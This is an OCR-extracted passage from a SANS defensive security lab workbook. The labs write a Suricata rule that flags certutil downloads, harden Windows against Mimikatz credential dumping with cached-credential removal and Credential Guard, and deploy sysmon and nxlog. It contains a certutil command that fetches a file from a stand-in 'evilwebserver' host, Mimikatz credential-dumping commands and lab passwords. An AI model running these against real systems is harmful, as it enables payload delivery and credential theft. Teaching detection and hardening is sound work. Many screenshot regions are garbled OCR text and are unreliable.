In the "Category" dropdownbox that becomes subsequently available, we can select the "emerging-trojans.rules" entry, which will reload the page and show all rules in that particular category below.

6

· X

C A Notse<ur<i ~ ''1 92,168.10.1 u11ata.1Sur1Qt.,_rui\>;.php

Ava1lablo Rula Ciitegoues
"'"<t:.I ru ..~ · Rule Stgnalure 10 (SID) Enablo/D1sabl11i Ovund·s

95·¥1

l0 f·@7#1:f

Rulo· Viow 1="1ltor

Rule Signature 10 (SID) Enoble/01111ble OyarndH;

le,o,e,,d 0o..f..,,'tENic..0 0£,--at..dbrlo~ ........~ b S.U~~ j\.,,_,.ee.'O""tt...-t

Q 0 G) C~Wo;O,~"'lf O.t~h _.,. ~~O"t"ilDMf'r\ . . P...-· ~

·O"C9

Sl&1t' Action Gil> SID

0 A

.: '° ·s

0 A

..:OOJ.11

P,oo, s_..
t<O SttOMLNIT
t<O SIIC,..f_t<ET

SPon
...,,
.,.,

_,_.la.Of'.,id t,t:oona,,1rr,od.'it,db.-fllt)M;n"t

!>Pon

SEl<TERl. .. t..., , H

·6666 7000

SfXTl'RNAl_'<fT

6666 7000

0 A

~),()

1<!> $HOl.4LNE1'

""Y

El A

:oro1,1

t<O $110,..LKET

.,,,

SEl<TIRtl/\LNH SE'XTfRNAl._'-f:T

6661'6661-

C
MH!laot" E1' TROJAN !AC "'"'' °"'090 on non-,ienda1<' por:-ET TROJAN 1RC Ptlult:
oon ff!.eUA~"' Mft-ltandatd
E1' TROJAN lllC DCC <1161 r!"qUeM Ofl l'IIOfkUINllfO pon ET TIWJAH rRC C1'1,i.nnit1· )Oln

© 2017 Erik Van Buggenhout & Stephen Sims

183

6. Reviewing a specific Trojan rule Let's have a look at the C&C rules that have already been added to the Suricata emerging-trojan category. We can do this by pressing CTRL+F and searching in Chrome for the string "C&C". One of the first hits should be rule number 2009054 with title "ET TROJAN Asprox Form Submission to C&C''.
You can further analyze this rule by clicking on the rule number (or SID) in the PfSense interface. It appears that this rule was written to match a number of specific patterns in the HTTP request, which were most likely hardcoded in the malware:
o "/forum.php" (most likely the URL)
o "boundary=1BEF0A57BE110FD467A"

~

C A Not,e<urt ~ 192.168.10. 1 ,

8 -0X
e. * :

i,-, "·Ft -cp )..O.,_"«. ·'I· ll\ (11-.;A.._IQ.t ·

".i.t (f IQ.J.:.o l.·~"'O· fOl"'P '!riM1t'l:it

· lA · I t , «'l=)Clll<-f'-4d.T._~· «ta't· fllt&T ac<.ti··, ,,..· .;:.,..,...."OC,.

""CK·"'· nit't·"" · fVV11,"". "'to_;,,.-1,

,,y,.·-.· '"(ortf'l"t -hre »I -..l~lrrtt',,...-

,r· JD' ~Y"t~::.a"'M'.ao'fl.::.l~~IIA'· ·tt;,.l'IN1'";

,i11.,...-,,..,.. . ....., · r·'--~··-1,t"«.~i:l.lt.c"U' '- ,..,...I~- cl· O ~y.» f'f'C)M·IICt~.~'J· I

7. Detecting new attack technique with a custom rule
A relatively new TTP (Tactics, Technique, Procedures) used by attackers, is using the built-in Windows tool "certutil" to download payloads. Certutil is normally used to manage certificates, but it also allows users to download arbitrary files to the filesystem via the command-line. As an attacker, using certutil has a number of advantages, as it could bypass for example whitelisting techniques.

There is currently no rule in Emerging Threats to detect this type of behavior, so let's try developing something ourselves!

Certutil identifies itself with its own User Agent String (a HTTP header) and we will use this knowledge to write a Suricata detection rule!

8. Creating a custom rule

Inside the "WANNO Rules" submenu, please select "custom.rules" as the category (from the drop-down box). This will open the custom rule editor inside the web

184

© 2017 Erik Van Buggenhout & Stephen Sims

interface (which should currently open a blank page).

We can try writing a rule as following:

alert http $HOME_NET any-> $EXTERNAL_NET any (msg: "CertUtil User Agent"; flow: established,to_server; content: "User-Agentl3al CertUtil URL Agent"; nocase; http_header; classtype: trojan-activity; sid: 3000001; rev: 1;)

Feel free to copy / paste this rule if you'd like or alternatively try constructing it yourself!

Let's analyze what this rule is all about:

o It only investigates the http protocol

o It is looking for outbound connections (on any ports) (see the direction of the HOME_NET & EXTERNAL_NET)

o It is looking for a User-Agent header with the value of "CertUtil URL Agent"

o It will be part of Suricata's Trojan category

o The rule number (SID) will be 3000001

Once the rule has been completed, please press the "Save" button on the bottom of the page.

~ ~!fncl«hl·b~<C X ' f.ae1r,i, 0-·"

"

f,

C A Not secure ~ 192.168.10, 1 >< cat,lls""'h , ,,,.,,..

~ ~ F~e"'d I( Ct.<koo SlltlObo> Cl Samples· £,., ..-.a., I] Klbont

Ntsw>

! ~-~~-~ .. .

. .. . .

· MISP

e

·

* 0.

. .

.

Suricata / Interface WAN I Ru es: custom.rules

Av1il1blo Rule Ca tegooes

C.teoory

~.,,~om rui-ts
~t lftl: nl~ C,,,tegQ«'J to..,~,._ end ~Of

Oef1nod Custom Ruins

9. Triggering the rule
We will now use certutil to simulate the download of additional payloads.

As already indicated, certutil is a command to manage certificates on Windows. It
has the capability to download certificates, but researchers found out that it can

© 2017 Erik Van Buggenhout & Stephen Sims

185

actually download any content. To abuse this, please do the following: o Open a command prompt o Enter the following command:
certutil -urlcache -split -f http://www.evilwebserver.com file.b<t
This will instruct certutil to download the index page from http://www.evilwebserver.com and write it to disk (filename file.bet).

10. Checking for alerts
Once the previous command is completed, please return to the PrSense web interface and go to the "Alerts" tab under Suricata. You should now observe that an alert was generated for the rule we just created!

flS' pfum,_synct,clwlbH< X

~

C .t. Not 1.a.ore ~ 1192.168.10.1 sutocai. sunat.a.aleru.php?instance-0

'°6 ~ ,.._. 'L; CucltooSondbo, I) 1.amp1ti · (,,;,~ [ ) iubon· 0 t,,_, I.AISP CTF

-E...Sen' e-

services I SUncat a / Alerts

8

· X

Q *

..

Alart Log VIGW S· ttIng1
~'«><mfO'lfT) WAM IWf'..tt ~!IN:t' lllfrt: ,ca, IJ#!SIC~

S...let~

Al 11:JO tJes 'fll'II c- aaY't'G
El:I
W..~lf\· ~H1WIQI

m

Alert log View ffltar

Last 2$0 Alert Entnes (Mo1I recent ·ntr1e1 art llstod f1nt)
1 "1 ·m·
Q·

0 10 15
Q3

Dl'<ln 10

O

CIDSID I !:00001

C- · UM< A9f"'

11. BONUS: Dashboaring in alerts in ELK
If you have the time, a bonus exercise is to configure Suricata on pfSense to forward alerts to our ELK stack.

186

© 2017 Erik Van Buggenhout & Stephen Sims

The procedure can be found here: https://blog. re boost. net/suricata-on-pfsense-to-elk-stack/
,-

© 2017 Erik Van Buggenhout & Stephen Sims

187

This page intentionally left blank.

188

~ 2017 Erik Van Buggenhout & Stephen Sims

SEC599-4.4: Exercise - Hardening Windows to stop lateral movement
Objective
Throughout the exercise, we will complete the following steps:
· Implementing password complexity settings · Removing the cached credentials in Windows · · Enabling enterprise guard throughout the environment · Attempt ing to dump credentials using local administrative credentials Scenario Virtual Machines
1. SEC599-C01 - Windows02 2. SEC599-C01 - DomainController 3. SEC599-C01 - Firewall
Exercise 1 : SECS99-4.4
· Implementing password complexity settings · Removing the cached credentials in Windows · Enabling enterprise guard throughout the environment · Attempting to dump credentials using local administrative credentials
1. Logon to Windows workstation as Nick Fury As before, we will authenticate to the Windows workstation using the following credentia Is:
Username: nick.fury Password: Awesomesauce123

2. Open a command prompt with elevated privileges We will launch a command prompt with elevated privileges, which we can achieve in the following way: o Right click the command prompt icon in the taskbar o Right click "Command Prompt" o Select "Run as Administrator" o You can provide the following credentials:

· Username: .\student-localadmin · Password: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

189

,: 1. Command Prompt ~ Unpin from taskbar

Run as administrator Unpin from taskbar Properties

3. Browse to the Mimikatz directory
Once t he command prompt is launched, please navigate to the following directory:
C: \Users\n ick.fury\Desktop\M imikatz\x64

4. Attack 1 - Stealing cached credentials
Next step, we will attempt to dump cached credentials from the Windows machine. These cached credentials are used in the event that the workstation cannot connect back to t he domain controller to validate credentials. We can achieve this using the following commands:

C:\Users\nick.fury\Desktop\Mimikatz\x64\ Mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate

190

© 2017 Erik Van Buggenhout & Stephen Sims

mimikatz # lsadump: :cache
The result of this command should reveal that the following credentials are in the cache:
o SYNCTECHLABS\nick.fury
o SYNCTECHLABS\Administrator
Again, this is the expected behavior for a Windows workstation (store the cached credentials of the last 10 authenticated users). Note that these are not LM or NTLM hashes, so they cannot be reused in a Pass-the-Hash attack. They can however be of use for an attacker in an attempt to crack them offline.

5. Attack 1 - Switch to the domain controller Now, let's disable the caching of domain credentials at enterprise level using GPO's. As a first step, let's authenticate to the domain controller using the following credentials:
o Username: Administrator
o Password: Sec599 In the "Server Manager" that pops up, click "Tools" and open the "Group Policy Management" window.

© 2017 Erik Van Buggenhout & Stephen Sims

191

fa. S.,,v,r M·n·g"
.. Dashboard

-

0

X

ii Dashboard i Local Server I i All Servers
fi1 ADOS
£ ONS
ii; File and Storage Services 1>

WELCOME TO SERVER MANAGER

8 (onfgure

WHAT'SIF!J./

2 Add r'11el
3 A.dd othel
.._·eate a
[
5 Connect

ROLES ANO SERI/ER GROUPS

Active Direct<>,y Oomo,ns ..,d TNru ~ Directory Module for Windov.-. P0WorShell Acwe Directory S.tes ond ~,ce, Ac~w D,rectory Users and Computers ADSI Ed,t C o m p o M n t ~. . Computer Monagem·nt Delragmcflt and Optimize Doves
l),sl:Cleanup
CNS EwntV~ Group Pol«:y M·n~-nt iSCSJ lnmator Local Sttunty Pol,cy MIC10soft Azu~ Ser.oces OOBC Cota Sources (32-bit) 008C Data Sourc.. (64-b,t) ~ormar,ce Monrtor Pnnt Managtrnont ~rce Morutor SeM<eS ~t,,n Cormqurat10n

6. Attack 1 - Edit the domain policy We will now open the "Default Domain Policy" for editing by: o Drilling down the menu on the left: Forest: synctechlabs.com -> Domains-> synctechlabs.com
o Right-click "Default Domain Policy" and click "Edit..."

192

© 2017 Erik Van Buggenhout & Stephen Sims

_.. Group Policy Management
··I1...:1 File Action View Window Help r j )( it fi l

D X
- ...

Group Policy MaNgement
11 v Forest synctechlabs.com
v Domains
synctechlabs.com

Default Domain Policy Scope Detlllls Settr,gs DelegallOII Unb

· Default Domain Otsplay lrb., lhs loc:abon:

S)fldechlabs.com

) Doma1

Edit...

~ OU. a,e linked to tlis GPO

"

> j Group

Enforctd

>

~
:J

WMI F Starter

..,,

> tc Sites
r: Group Pohcy I

., Group Pohcy I

Lmk Enabled Save Report...
v-
New Window from Here

r-----~-=-o_,ce_d _~_es_En~abled-- =~can I >

y apply to the folowng ~ - users and ~ ! ! f l:

< Opm the GPO editor

Refresh Help

Add ...

Remove

WNI Allenng This GPO· linked to the folowng WMI fie,

7. Attack 1 - Open the registry menu As a next step, open the following menu:

Computer Configuration -> Preferences-> Windows Settings-> Registry

Group Pohcy Management Editor

File Action View Help

..

0

Default Domain Pohcy (DC.SYN! v ~ Computer Conf,gurabon
Pohc,es
v Preferences
v Windows Settmgs ~ Environment ,j.' Files
L.S Folders j) In, Files > ,!k Regist,y
._J Network Shares ..ci Shortcuts ~ Conbol Panel Sdt1n! v a User Configuration Pol1c1es
Preferences

D X There ·re no Items to show on this view.

<

© 2017 Erik Van Buggenhout & Stephen Sims

193

8. Attack 1 - Open the "disabledomaincreds" key We will now adapt the "disabledomaincreds" registry key and set it to "1", which will effectively stop caching of domain credentials. This can be achieved by: o Right-clicking the Registry menu and selecting "New"-> "Registry Item" o Under "Key Path" click the"..." button o Drill down as following:
· HKEY_LOCAL_MACHINE · SYSTEM
· CurrentControlSet · Control · Lsa
o In the window under the directory structure, you can now scroll and identify the "disabledomaincreds" key, please click it
o Confirm selection with the "Select" button
9. Attack 1 - Adapt the "disabledomaincreds" key Upon selecting the key, we will now change it: o First change the base to "Decimal" o Next, adapt the "Value data" to "1" o Select "Apply" o Close the window with "OK"

194

© 2017 Erik Van Buggenhout & Stephen Sims

' Gn,up Polia- r-.i!!Ngm,mt Editor

Ll

Fdt! Action View Hi,lp

·

~ N..w R"91stty Propt!rti6

X

Default Domain Pohcy [DC.svN V L Computl!r Configuration General C -

..J Polm6

V

Prt!fl!rl!nC6

Windows Sd:bngs
Iii Environml!nt
,ft fll6

tt<EY j.OCAL_MA0111E

0 show In this Vll!W,

;:/ Fold..n
i) ln1F1f6
Jt Rt!gtstry

l('eyPalh:

~ Nt!twork Shar6
.d Shortcuts

0Detaut

l::!!J Control Panel Setttnc

v I Us..r Configuration

l vaue type:

[ SYSlcf·f(l,renK:o-n-tro'lSe-t'¥..;:;o;:n:::t:r:,=:,= llsa= ~ ,;:::_::,-.-:

Pohc16
> Prd..renc6

< Registty

10. Attack 1 - Remove the existing cached credentials
We have now disabled the storing of cached domain credentials. This however doesn't erase the cached credentials that are already present! They are stored in the following registry location:

HKEY_LOCAL_MACHI NE\Security\Cache

I n this location, you will notice that a number of entries exist that are named NL$1, NL$2, ... up to NL$10. These represent the 10 cached credentials that Windows stores by default. In our event, only the first two keys are being used, so we will "zero out these" keys.

Should you want to achieve this on enterprise level, it's a good idea to update ALL keys (so from NL$1 to NL$10) to the value of "O".

We can achieve this in the following way: o Right-click the Registry menu o "New"-> "Registry Item"

o Key Path: "Security\Cache" (NOTE: you'll have to type this value manually)

o Value name: "NL$1"

o Value type: "REG_BINARY"

o Value data: "O"

Click OK to confirm this field, afterwards, please repeat this step for the "NL$2" key

© 2017 Erik Van Buggenhout & Stephen Sims

195

as well.

.. 0

r Default Ooma,n Policy [DC.SY~ General COIMIOO

v

Computer Configuration

Pohc,es

V

Preferences

v Windows Settings

Ii) Environment
ft Files
Ci· Folders jl Im F,les
Jk R~,st,y
a] Networlc Shares
.d Shortcuts
.:!1J Control Panel Sett,n
v ~ U$er Configuratoon

tjve:
t.ev Path, v,a,ue,-
· 0efau1
Y.al>e type

t«EYJ.OCALJW)11NE [ Seo.,,ty'i(:ache
N.ll R.fGJIINARY

Pohc,es
> Preferences

Y~data:

ot

X

V
V
-,

Action Hove Update HKEY_LOCAL_MAC

Q(
_ _ _ _ _> \ Preferences Extend~A Standard
11. Attack 1 - Switch to Windows workstation Next, we will switch back to our Windows workstation and we can run the following command in a command prompt: gpupdate This will refresh the Group Policy, thereby ensuring caching of domain credentials is disabled AND existing cached credentials are overwritten with "O".

12. Attack 1 - Confirm fix using Mimikatz
Finally, we will again attempt to dump cached credentials from the Windows machine. We can achieve this using the following commands:

C:\Users\nick.fury\Desktop\Mimikatz\x64\ Mimikatz.exe mimikatz # privilege: :debug mimikatz # token::elevate

196

© 2017 Erik Van Buggenhout & Stephen Sims

mimikatz # lsadump: :cache The result of this command should not reveal any cached domain credentials.
· m1m,otz 2. I.1,61 (ouo)

· X

13. Reboot the Windows workstation As we've played around with the LSA storage, let's make sure we reboot the machine to ensure everything continues operating in a stable fashion.
14. Preparing our next attack: credentials in memory The next attack we will mitigate is where Mimikatz attempt to dump credentials from the memory of the LSASS process, which is something we will mitigate using CredentialGuard.

We will first introduce a set of interesting credentials in memory by authenticating to our machine as a domain administ rator:

o Username: SYNCTECHLABS\Administrator

o Password: Sec599

Upon authentication, we will immediately switch to our Nick Fury account:

o Click the start button in Windows 10

o Right-click the "Person" icon

......

o Select "Switch account"

o Select "Other user" in the bottom left corner

Re-authenticate using the following credentials:

o Username: SYNCTECHLABS\nick.fury

o Password: Awesomesauce123
We have now effectively ensured that the domain administrators credentials are loaded in memory on our Windows workstation.

15. Attack 2 - Dumping credentials from memory Inside the "Nick Fury" session we will now launch an elevated command prompt: o Right click the command prompt icon in the taskbar o Right click "Command Prompt"

© 2017 Erik Van Buggenhout & Stephen Sims

197

o Select "Run as Administrator" o You can provide the following credentials:
· Username: .\student-localadmin
· Password: sec599
o Inside the command prompt, change directory to "C:\Users\nick.fury \Desktop\Mimikatz\x64\"
In this simulated attack, we assume the attacker has found a way to obtain local administrator credentials and now wants to use these to further escalate to domain administrator. We will run Mimikatz to dump all credentials in memory:
C: \ Users\nick.fury\Desktop\Mimikatz\x64\ Mimikatz.exe mimikatz # privilege: :debug mimikatz # sekurlsa::logonPasswords
The output of the above command will be quite large, but when carefully scrolling, you should find that the clear-text (!) credentials of the Domain Administrator account are somewhere there (and have thus been successfully compromised). See the screenshot attached for the expected output.

16. Attack 2 - Configuring Credential Guard as a GPO
We will now configure Credential Guard to protect the LSASS process from Mimikatz' attacks. In a real enterprise environment, we should configure Credential Guard on the domain controller to be applied on all machines, but unfortunately, this is not possible due to a technical limitation in this virtual environment. Don't worry, we will configure it locally in the next step.
See the screenshot to have an idea how to correctly configure the GPO. Again, please don't try to replicate this on the Domain Controller in this lab.

198

© 2017 Erik Van Buggenhout & Stephen Sims

Tum On Virtual1zat1on Ba.sed ~curity ~ Tum On Virtual1:.abon Based ~urity

0 NotConfigured ® Enabled Q Disabled

Comment
Supported on: [ At least Windows ~rvtr 2016, Windows 10

· X

Options:

~lect Ph1tform ~unty Level:

~ure Boot a nd OMA Protection

"

Virtuali:.abon Based Protection of Code Integrity:

Enabled with UEA lock

Credential Guard Configuration:

Enabled wrth UEFI lock

Help;

Specifies whether Virtuahzatlon Based ~cunty 1s enabled.
Virtuah211tion Based ~unty uus the Windows Hypervtsor to provtde support for security services. Virtuahzatlon S.sed Secunty requires Secure Boot. and can optionally be enabled with the use of OMA Protections. OMA protections require hardware support and wtll only be enabled on correctly configured de"V1ces.
Virtuahzabon Based Protection of Code lntegnty
This setting enables v1rtualization based protection of Kernel Mode Code Integrity. When this 1s enabled, ltl!fnel mode memoiy protections are enforced and the Code Integrity validation path 1s protected by the Virtuahut1on Based ~unty feature.
The ·01sabled" option tums off Virtuabzation Based Protection of Code Integrity remotely rt' It was previously turned on with the "Enabled without lock" option.
..,,

OK

Cancel

Apply

17. Attack 2 - Configuring Credential Guard locally
We will now configure Credential Guard locally. For this, we'll need to update a number of registry keys. Right-click the regedit icon in the taskbar, right-click "Registry Editor" and select "Run as administrator" . You can use the following credentials:
o Username: .\student-localadmin
o Password: sec599
Next up, drill down to the following location: "HKEY_LOCAL_MACHINE\System \ CurrentControlSet\Cont rol\ DeviceGuard''
We will now add two DWORD value keys ( right-click "New"-> "DWORD (32-Bit ) Value" ):
· Add a new DWORD "EnableVirtualizationBasedSecurity"
· Add a new DWORD "RequirePlatformSecurityFeatures"
Finally, we will right-click both values (one by one), select "Modify..." and change the value to "1" and press "OK".

© 2017 Erik Van Buggenhout & Stephen Sims

199

We also need to add a key under the LSA control set. For this, drill down to "HKEY_LOCAL_MACHINE\ System\CurrentControlSet\ Control\LSA".
· As above, add a new DWORD "LsaCfgFlags" and set its value to "1". Close regedit.

Of Registry Editor

File Edit View Favorites Help

Dl!V1ceClas ,., Name

> DeviceCon

·I> (Default)

)

DeviceCon

t.'! Requ1reM1crosoftS1gned-8ootCha1n

Ol!llkeGua

~ EnableVirtuahutJonBasedSecurrty

)
>

DeviceOve DevQuery

ij~.·:;R!:4uirePlatformS«urityFHtures

> Diagnostic

Type
REG_SZ REG_DWORD REG_DWORD
REG DWORD

D X
Data (value not set) 0x00000001 (1) 0x00000001 (1)
0Jt00000001 (1 J

18. Attack 2 - Reboot the machine
Once regedit is closed, please reboot the machine (at the prompt, click "Restart Anyway").

19. Attack 2 - Authenticate as Domain Administrator To confirm the successful configuration of CredentialGuard, we will replicate the attack we did before and first authenticate as the Domain Administrator, using the following credentials: o Username: SYNCTECHLABS\Administrator o Password: Sec599 Upon authentication, we will immediately switch to our Nick Fury account: o Click the start button in Windows 10 o Right-click the "Person" icon o Select "Switch account" o Select "Ot her user" in the bottom left corner Re-authenticate using the following credentials: o Username: SYNCTECHLABS\nick.fury o Password: Awesomesauce123

200

© 2017 Erik Van Buggenhout & Stephen Sims

ci Alarm~ Clock
Change account settings
S,gn out Switch account
Code Writer
Connect
Q Cortana

Search Windows

20. Attack 2 - Confirm fix using Mimikatz To confirm our fix, we will run Mimikatz again: o Right click the command prompt icon in the taskbar o Right click "Command Prompt" o Select "Run as Administrator" o You can provide the following credentials:
· Username: .\student-localadmin · Password: sec599
o Inside the command prompt, navigate to the "C: \Users\nick.fury\Desktop \Mimikatz\x64\" directory
We will again run Mimikatz to dump all credentials in memory:

C:\Users\nick.fury\Desktop\Mimikatz\x64\ Mimikatz.exe mimikatz # privilege: :debug mimikatz # sekurlsa::logonPasswords

You should see some output, after which Mimikatz will crash (as it cannot access

LSASS).

© 2017 Erik Van Buggenhout & Stephen Sims

201

mimikatz. for Windows has stopped working
A prcblom oUS<d th· prog,.m to stop wol1cing cor,ectty.
a, \'fmdoMwill ctos, the p<ogrom ,nd notify 'I°" soluuon is
ovailable.

202

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-4.S: Exercise - Configuring & forwarding Windows event logs

Objective

The following are high-level steps in this exercise: · Deploying sysmon on all hosts in the Windows domain; · Installing nxlog on all hosts in the Windows domain; · Configuring ELK host; · Perform lateral movement and detecting it.

Scenario Virtual Machines

1. SECS99-C01 - Windows 2. SECS99-C01 - Firewa ll 3. SEC599-C01 - DomainController 4. SECS99-C01 - Ubuntu03 5. SECS99-C01 - Kali

,....

Exercise 1 : SEC599-4.5

The objective of the lab is to detect lateral movement taking place in our Windows Active Directory environment. We will accomplish this by using a combination of Windows event logs, syslog and ELK-based visualization techniques.

The following are high-level steps in this exercise: · Deploying sysmon on all hosts in the Windows domain; · Installing nxlog on all hosts in t he Windows domain; · Configuring ELK host; · Perform lateral movement and detect ing it.

1. Authenticate to domain controller We will start of by deploying sysmon in our Windows environment, which we will do centrally using GPO's. As a first step, authenticate to the domain controller using the following credentials:
o Username: Administrator
o Password: Sec599

2. Review the sysmon.bat script
In order to facilitate things, we have already provided a .bat script in the domain SYSVOL share (which is accessible to all domain users). You can find it on the domain controller in the following location:

© 2017 Erik Van Buggenhout & Stephen Sims

203

o C: \Windows\SYSVOL\sysvol\synctechlabs.com\Sysmon\sysmon. bat
You can open the folder by clicking the SYSVOL shortcut on the Desktop and opening the Sysmon folder. You can open the .bat script by right-clicking and selecting "Edit with Notepad++". As part of the .bat script, you'll see that:
o The script copies the sysmon configuration file from the domain share (SYSVOL) to the C:\windows directory;
o The script checks whether the Sysmon service is running. If it's not running,
it will attempt to start if. If it cannot start it, it will install it.
The idea is to have this script run periodically, to ensure all hosts in the domain have sysmon running, with the latest configuration file. Credits go to Pablo Delgado (syspanda.com) for this simple, yet effective, script!

In the next steps, we will use GPO's to ensure this .bat script is executed upon system startup.

LJ C:\Wind-.\.SYSVOL\.sysvol\,yncttthlobs.com\Sy,mon\>)',mon.bat · Notoptd·· (Adm,ni,t,.to·I

File Edit Starch Vit:w Encoding L,nguagt Settmg!i Tools Mtcto Run Plug1ns Window 1

H <) ...r

O O~ ~

"it 0: - C ·

,t '( '.'l

... I lJ: -i ~ i ) f:.; ·

e · > ~ ir.

t:i .,._,hot Cl ]

copy /z /y "'\\OC\,~·:11v01\.,ynceeehlat>., . cca\Sy.5a,0n\5yn:oncor.t1.o.XJ1.1· ·c:\w1.edow.s\· ·\\DC\aysvol\l!!ynceechlabs. coa\Sy.s1110n\,iysmor.6-C:. ~e.- / accepc.eul& -1 -c c: \Wi.n.dows\.,yaaonconCiq. xml.

que~)l ·sys1'0n· I

"'RONNING""

H 0 · !':IU>ORL ,II'! · ~QU · l · (

_, : 9-ta.rt.sySIIOO

It: ·>tSRROal..l.'11' ~· £00 ·1· ( goto truocaiiav~
... : 1 ns-ta.J.l.ayaaon .$ · \ \OC\ sy-.svol\avncc.e:ch.la.bs. ooa\Sy.s.mon\ syamon6~. exe· /acce:pt.eu.la -.1. c:\ v.1.ndow.s\syamcmcon!1.q. XJal

O X
JC,

3. Review the sysmonconfig.xml Sysmon is typically installed/ configured according to an XML configuration file. We will use the very well-known (& highly rated) base configuration file from "SwiftOnSecurity". It's been added to the same SYSVOL folder where you can find the sysmon.bat file.
Feel free to walk through the .xml file, as it is very well commented and is thus rather intuitive. In your own environment, you can choose to further adapt or tailor to your needs.
Once you are finished, please feel free to close Notepad++.

204

© 2017 Erik Van Buggenhout & Stephen Sims

, _.m ,J File Edot Sutch v;.,. Encoding l1n9u1go s, tt,091 Tools M,cro Run Plugms Window 1

o~f.:I ··

~=c · 'w.(,c "1 r .

iid ~ > · · l f : J !

D X X

, 1

·Y.s?::J:m--COC.!1.C I .a. ·Y.t:mo::1 cont1o,irae_1c,n toauien en d,e,tault ~Q'B-quall't#" ~·,ent t.ract.no ·nd ··ay custattizaUcr. b~ " .·
Ka~:er ·~r.dcnc 52 Dest.e: 201,-0.,-13

t'..a.s'!er aia:.ber: ISn:t'tOck~t.V, o ~ cc:t.r.1bu-:.ers el·c c:ed.lt.~::. 1n-11n.-. or cm U:t;.
Ka:i:.e: ~OJec:-:.: t;;r;!'lt/,-:).;....h,&:m Sa· as:m·----,-u·t·:m;.-.:c:.ftq

K.a,:.e..: 11Ce.::.J'tl Cz'eatlY~ ~ . A:t:i.tilticm 4.0 YGw r.a\· ~:-1\·,&tJ.it, !err, c-dlt, :iuc.~. pu.t,l!..:st, o:r d~~l:y tcr

Cc..:k "'ra1o.n: <>Ub

re.rt- a-a· r <lUA>

fC!.:k ~.:o)e'":: <lt A>

1.

P'\..:::k l1c:e·e: (":t ~

l6

ROff; Do net le~ the .t.apc.:1..nc; a1z~ ~d. c.aiq,lex1:v :t t.b.1,31 coct1.qurat.10:. ,cart! you err b;itldlftO yoo:r own ar ~t::&.

le

Tb.a c:ontiqu::a:.1~ 1..9 b.,:,~di ·roWld kr.cvn h1Qn-q-..:a11°'y ,.,.·nt ~r·c.l.nc, a:ld r;h1:.a lOC.itZ! ext.1ee.. 11· cctrTpl1Cated.

9

S:.n:ion cont1.q---....rat..1.en.a c:.lv llaYe to te: · .:.e~ 11:'}.es. DUt. ·1ontt1car.t ·!t.;i.::1: ha3 t~~ !n~"':ea 1.:: trcnt-lon:U:u: ae

,....._

2

=:..;:.t. tU:.cr1.e.; Al Pol~lb!.... C'ftt.O 'tt.t e.11.~ftt. Thl~ 1!1 --~ &aj(C a.::.al ;:J.1!! C.! 1.C.t.r-~1=~ r..os:u,1c ~./ ha.::.o. a:ld --:-y 't

~!at.., &!),Cll,&.cu.s act.1.·1.~v a.s q-.ucr-ly ·a pcs.s1.b.le 'to ·=r :~c~c2.a.n a::ae~ c:.ly v1-;:a Evcz.:. \"'!ever.

2:

,,...

1 ,1

,=-~ NOTE: :lyiu:on 1.s .:..o:. barcser.ed. a;a1n,t a o.etet'11Lln~d attac·.. t w1tl': a ~ rig~t..,. ;~i.ac. t.hie ccmt1oa::ac.1oc c!ter· an

':O &-;Udy 1.. ~lc.!cly. lltver!Ll wa.ye ~o f!Vo}de

at :.he aler't:.:-:.q. It yot.. a1rc 1.t\ · hJ.Qn-t.hrea.t: e.nvir~t a..:...d ha·

--

a

seeu:1ty statt. YCN 1!'::i:l:l,:t c:on.-1die:- a. a:ct t"roa~e: loo~a ll awroacb. l:lowe.'lier,. 1n t.?:.e Ta.st m:.a1on t y ct ca~e:·,. ac

·

v1.U t.;:rb:e alon; Ul:rouq-h sulttpl.e- be-b&Y10ral u.ap., vtu.C. :!Ua ca:..!1~ll':.1CC. 1:0:ll'tCTII. -esp.,e-c.i.ally l l i.t.c. !'U3"; r

2'

:lOTE.: ·taa;c· 13 a tcc:hnl.cal t.e.nm. tc.r: .a CQIIIP1le!! t1..~ry rile l.ft an txf: ~r DU. llao, 1t can u,tc?:i :,ce:. ~t.~ .t1let

·ftocc:,:1~..a· 1: rar:.ij,:mily o.,.n,rao::e.c., ne:11;:-....a, and t:-aclrej by S',·:r~!'t :c o&a1.e:. ..r.. -;rcc:.1r.q 1.o.0.1v1.dul ~~c,

,0

· LoQ1nGu..t.a· 1· rendoa.:.y oene:att"l. ·a,1,;m~c:1. ~ 'tracked t,y Syn:c:-. c.o ··ol·t. .t~ tr·d.nQ :.r.cu..,.:.cual u.:er ····

---

>

---

4. Review the nxlog.conf &amp; .bat files

--

Inside the SYSVOL folder, we've also included a NXLog folder. Inside, you can find the installer, an nxlog.bat and an nxlog.conf file. The .bat file is rather

straightforward and will be used in a GPO to correctly deploy nxlog in our Windows

environment. Feel free to have a look (you can right-click and select "Edit with

Notepad++").

A slightly bigger file is the prepared configuration file (nxlog.conf). You can right·

click the nxlog.conf file and select "Edit with notepad++" to review the document.

As you scroll through it, you will notice that the configuration is rather

straightforward:

.....

o A number of "queries" is defined to filter the event logs that are to be

.....

forwarded (we've added the Sysmon entry to the default entries (System,

Application, Security)).

o At the end of the file, an output host is configured, which we've defined as our Logstash host (192.168.30.16 on port 5000)

Feel free to analyze the .conf file in-depth, but there is no need to adapt anything. Once finished, please close the configuration file.

© 2017 Erik Van Buggenhout & Stephen Sims

205

C' c.-1w.-.\SYSYOL,~Khlol>,.com\NXl.og ""°9.conl · Not.pod·· 1 - 1

· X

F,.. ld· S«,(h v,..,. lncod,ng l·ngu,g· SdlJng, Toob M<Kro Run Plug.,. Window r

X

0 H · · l \J G1 :

· la t t

~ "', 11 ";J. -

I ' t.

· · · l,i'. tZl

I l:l<W-l-ll.larnn;o::;:-,-u-.-,---l·_co_r._fl_q;_~r-ac-1-on-r1-1-.,.-5.,-.,-~-n-·-.,,.-1-ao-.,-,r-.r-..,,-.,-.,-_,,-u-al,......,abc>U_t......,tll-·-------------t

tf ccr.t1.q.;rat1.on opt10n·. It abo-J.ld. b· 1r:.st.alled loc.elly and 1.· alao ava.1labl~

f f onl1ne at bt.t.o·//nll99 Prs(;S,pc;p/ tf Plea1e .tet the ROOT to the told.er your r..x loo wa1 1n.,"t.alled into,

·· othe:rw1a~ l.t. w-1.ll not ac.a:-c.

t~.e:r1.ce R:>OT C:\Pro,gr... F1le·\nxloq ~.f1.ee It.OCT C;\P=o;::-... r11e:s Cz~6 r.Jr.!OO

